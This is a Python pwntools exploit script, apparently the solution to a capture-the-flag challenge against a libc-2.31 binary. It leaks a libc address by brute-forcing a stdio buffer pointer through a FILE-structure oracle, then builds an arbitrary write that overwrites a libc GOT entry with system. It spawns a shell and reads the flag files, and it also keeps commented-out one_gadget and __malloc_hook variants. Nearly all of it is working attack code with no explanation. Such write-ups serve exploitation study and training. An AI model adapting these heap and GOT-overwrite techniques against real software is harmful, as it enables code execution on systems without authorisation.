from pwn import *

BIN_NAME = '../distfiles/chall'
REMOTE_LIBC_PATH = '../distfiles/libc-2.31.so'
REMOTE_ADDR = os.getenv('HOST', 'localhost')
REMOTE_PORT = os.getenv('PORT', '9090')
LOCAL = False

elf = ELF(BIN_NAME)
context.binary = elf

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)
TIMEOUT = 0.02 if LOCAL else 0.2

def prompt(cmd):
    if b'\n' in cmd: raise Exception()
    stream.recvuntil(b'> ', timeout=TIMEOUT)
    stream.sendline(cmd)

def localbuf(payload):
    prompt(b'0')
    prompt(payload)

def allocedbuf(payload):
    prompt(b'1')
    prompt(payload)

def devnull(payload):
    prompt(b'2')
    prompt(payload)

def stdout(payload):
    prompt(b'3')
    prompt(payload)

def is_valid_tinybuf_prefix(read_end: bytes):
    payload = p64(0xfbad2887) + p64(0) + read_end
    allocedbuf(payload)
    line = stream.recv(1, timeout=TIMEOUT)
    if len(line) != 0: return True
    else: return False

stdout(b'hoge')

tinybuf_addr_bytes = b''
for i in range(0, 6):
    for b in range(256):
        if b == ord('\n'): continue
        if i == 0 and b != 0x23: continue
        if i == 1 and hex(b)[-1] != '7': continue
        if i == 5 and hex(b)[-2] != '7': continue
        cand = tinybuf_addr_bytes + b.to_bytes(1, 'little')
        if not is_valid_tinybuf_prefix(cand):
            print(f'{b} / 256...')
            continue
        tinybuf_addr_bytes = cand
        addr = unpack((tinybuf_addr_bytes + b'\x00' * 8)[:8])
        print(f'{hex(addr)=}')
        break
    else:
        raise Exception("not found")
tinybuf_addr = unpack((tinybuf_addr_bytes + b'\x00' * 8)[:8])

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so' if LOCAL else REMOTE_LIBC_PATH)
libc.address = tinybuf_addr - 0x1ec723

print(f'{hex(libc.address)=}')

def aaw(addr, content):
    print(f'*{hex(addr)} = {hex(content)}')
    localbuf(b'A' * 0x18 + p64(addr)[:6])
    allocedbuf(p64(content))

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84, 0xe6e73, 0xe6e76]

# malloc@got.plt at libc (unwritable)
# aaw(libc.address + 0x1eae30, libc.address + one_gadget[0])
# ???-got at libc
# aaw(libc.address + 0x1eb100, libc.address + one_gadget[0])
# __strlen_avx2@got.plt at libc
aaw(libc.address + 0x1eb0a8, libc.symbols['system'])
# __malloc_hook
# aaw(libc.symbols["__malloc_hook"], libc.address + one_gadget[0])

stdout(b'/bin/sh')
sleep(1)
stream.sendline(b'/bin/cat /flag*')
print(stream.recv(timeout=TIMEOUT).decode())

stream.interactive()
